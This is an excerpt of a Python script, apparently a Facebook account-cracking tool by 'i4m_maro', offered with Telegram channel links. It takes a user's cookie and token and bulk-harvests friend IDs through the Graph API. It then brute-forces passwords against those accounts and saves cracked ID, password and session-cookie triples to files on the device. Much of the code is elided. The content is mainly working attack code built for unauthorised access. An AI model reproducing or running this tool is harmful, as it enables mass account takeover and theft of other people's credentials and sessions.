...
###--------[ MARO ]--------###
Author   : 'i4m_maro'
Github   : 'github.com/maro-hacker'
Version  : 'v.2'
Channall : 'https://t.me/TEAM_1778'
Channall : 'https://t.me/staffi_1778'
#------------[ 1778 ]--------------#
...
def TSMARO():
	try:
		os.system('clear')
		banner()
		your_cookies = input('\x1b[38;5;10mCookie:  ')
...
def menu(my_name,my_id):
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		exit()
	elif _____alvino__adijaya_____ in ['98']:
		exit()
...
def dump_massal():
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(9999999)&access_token='+token, cookies = {'cookies':cok}).json()
...
def passwrd():
	...
	print('')
	print(' YOR REDY FOR CRACK : (Y/T)')
	woi = input('[➣_] CHOICE: ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[➣_] GOOD LUCK ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
os.system('clear');banner()
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ 𝐌𝐀𝐑𝐎 ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ MARO ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='MARO-TN CP'))
					open('/sdcard/MARO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MARO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'█▓ ID       : {idf}\n█▓ PASSWORD : '
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='MARO-TN OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MARK-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MARO-TN OK[/bold green]'))
					ok+=1
					break
